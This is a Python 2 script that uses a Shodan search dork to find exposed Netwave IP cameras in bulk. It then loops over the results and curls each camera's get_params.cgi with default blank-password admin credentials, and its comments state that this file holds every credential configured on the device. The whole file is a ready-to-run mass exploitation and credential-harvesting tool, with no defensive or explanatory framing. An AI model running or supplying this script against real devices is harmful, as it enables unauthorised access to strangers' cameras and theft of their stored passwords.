#!/usr/bin/python2.7


## For Netwave IP cameras
##
## Run this to get the "get_params.cgi" file, which contains all the credentials configured in the device.
##
## Shodan dork: 'Content-Length:372'


##Variables:
source_file = 'netwave.txt' #Name of source file
vuln_file = 'get_params.cgi'#Vulnerable file to fetch
counter=0
timeout = 30 #Timeout in seconds

#Shodan_api key:
shodan_api = ''

#Password for the webpage, generally its "user:admin , password:<blank>" but change it accordingly
creds = 'admin:' #Syntax -- 'username:password'  ; Here the password is blank

output_dir = 'results' #Output directory
search_term = 'Content-Length:372' #this particular term searches for netwave based devices.

import os, sys
import shodan

def src_file(shodan_api, source_file, search_term):
    api = shodan.Shodan(shodan_api)
    results = api.search(search_term)
    try:                
        with open(source_file,'a') as ras:
            for addr in results['matches']:
                ras.write(str(addr['ip_str'])+':'+str(addr['port'])+'\n')
        ras.close()
    except shodan.APIError, e:
        print 'Error: %s'%e
        sys.exit()

    
def pawn(shodan_api,search_term,counter,source_file,vuln_file,creds,output_dir,timeout):    
    if(os.path.isdir('./'+output_dir)==False):
        os.makedirs(output_dir)
        
    if(os.path.isdir('./'+output_dir+'/error_responses')==False):
        os.makedirs(output_dir+'/error_responses')
        
    if(os.path.isfile('./'+source_file)==False):
        print "File not found\nCreating file using Shodan..."
        src_file(shodan_api, source_file, search_term)
        
    if(os.path.getsize(source_file)==0):
        print "File is empty\nGetting IP adddresses using Shodan..."
        src_file(shodan_api, source_file, search_term)
        
    with open(source_file,'r') as f:
            lines = f.readlines()
    #Main Loop:
    while True:    
        try:
            server = lines[counter]
            #Make sure that this returns ip address and port correctly!!
            server = server.rstrip()
            server = server.split(':')
            ip_addr = (server[0]+':'+server[1]).rstrip()            
            #Filename generation:
            filename = (server[0]+'_'+server[1]+'.txt').rstrip()
            file_path = os.path.join(output_dir,filename)
            print '%4s:  '%str(counter)+ip_addr
            #URL generation:
            url = ip_addr+'/'+vuln_file #Scraps the vulnerable file
            
            #Execute curl with required syntax
            os.system('curl -s --max-time %s --output %s --user %s %s'%(timeout, file_path, creds, url))
            
            err_path = os.path.join(output_dir+'/error_responses',filename)
            try:
                if(os.path.getsize(file_path) < 3000): #Files below 3000 bytes generally cointains error responses
                        os.rename(file_path, err_path)
            except:
                pass
            counter=counter+1
        except KeyboardInterrupt:
            print "Interrupted! , exiting.."
            f.close()
            sys.exit(0)
        except IndexError:
            print "\n Finished!"
            f.close()
            sys.exit(0)
        except:
            print "Some error occurred!"
            raise
            f.close()
            sys.exit(0)
            
if __name__ == "__main__":
    pawn(shodan_api,search_term,counter,source_file,vuln_file,creds,output_dir,timeout)
